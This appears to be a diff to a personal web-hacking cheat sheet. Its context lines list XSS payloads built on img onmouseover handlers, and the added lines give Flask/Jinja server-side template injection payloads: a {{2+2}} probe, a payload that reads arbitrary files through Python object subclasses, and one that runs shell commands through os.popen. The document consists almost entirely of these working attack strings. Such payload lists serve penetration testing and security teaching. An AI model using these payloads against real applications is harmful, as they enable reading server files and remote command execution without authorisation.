@@ -106,3 +106,15 @@ or change something
 <img SRC="test" onmouseover=confirm('Hello') />
 <img SRC="test" onmouseover=alert('HHelloello') />
 <img SRC="test" ONMOUSEOVER=alert('HHelloello') />
+
+### SSTI (server side template injection)
+
+flask for instance
+```
+check
+{{2+2}}
+LFI
+{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
+RCE
+{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
+```
